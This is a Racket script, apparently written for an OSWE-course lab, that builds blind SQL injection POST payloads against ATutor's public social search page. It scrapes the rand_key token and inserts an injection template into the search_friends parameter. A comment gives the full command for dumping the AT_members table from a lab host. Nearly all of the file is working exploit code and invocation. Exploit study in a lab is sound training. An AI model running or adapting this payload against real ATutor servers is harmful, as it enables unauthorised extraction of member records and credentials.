#lang racket

(require net/http-client)

(provide generate-string)

#|

Example from ATutor lab machine from OSWE course

Command to run:

`racket blind-sql.rkt -d atutor -t AT_members -s "Offensive" -H "Content-Type: application/x-www-form-urlencoded" dump-table POST 192.168.153.103 /ATutor/mods/_standard/social/index_public.php script:examples/atutor-post-data.rkt`

|#

; Copied from https://github.com/johnnyodonnell/blind-sqli/blob/master/lib/request-generator-factory.rkt#L9
(define read-response
  (lambda (response [first-iter #t])
    (let ([line (read-line response 'any)])
      (cond
        [(and first-iter (eof-object? line)) ""]
        [(eof-object? line) '()]
        [first-iter
          (string-join
            (cons line
                  (read-response response #f)))]
        [else (cons line (read-response response #f))]))))

(define get-rand-key
  (lambda (response)
    (cadr
      (regexp-match
        #px"rand_key\" value=\"(\\w+)\""
        response))))

(define generate-post-data
  (lambda (response)
    (let ([rand-key (get-rand-key response)])
      (format
        "search_friends_~a='/**/AND/**/~a);#&search=Search&rand_key=~a"
        rand-key
        "~a"
        rand-key))))

(define generate-string
  (lambda (host)
    (let-values
      ([(status headers response)
        (http-sendrecv
          host
          "/ATutor/mods/_standard/social/index_public.php")])
      (generate-post-data
        (read-response response)))))

; From https://stackoverflow.com/a/28591678/5832619
(module+ main
         (generate-string "192.168.153.103"))

